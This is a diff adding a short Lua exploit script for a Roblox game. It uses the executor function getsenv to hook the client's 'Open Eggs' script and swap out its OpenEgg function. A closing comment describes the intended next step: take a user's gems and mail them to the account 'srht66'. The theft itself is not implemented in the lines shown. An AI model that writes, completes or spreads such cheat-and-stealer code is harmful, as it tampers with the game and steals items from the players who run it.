@@ -1,0 +1,18 @@
+repeat wait() until game:IsLoaded()
+    local Original_OpenEgg = nil
+    local OpenEggsScript = getsenv(game.Players.LocalPlayer.PlayerScripts:WaitForChild("Scripts"):WaitForChild("Game"):WaitForChild("Open Eggs"))
+    function SkipEggAnimation()
+        if not Original_OpenEgg then
+            Original_OpenEgg = OpenEggsScript.OpenEgg
+        end
+        
+        OpenEggsScript.OpenEgg = function()
+            return true
+        end
+    end
+
+    function RestoreEggAnimation()
+        if not Original_OpenEgg then return end
+        OpenEggsScript.OpenEgg = Original_OpenEgg
+    end
+-- mail steal user - ara - get:allgems then mail to - 'srht66' --
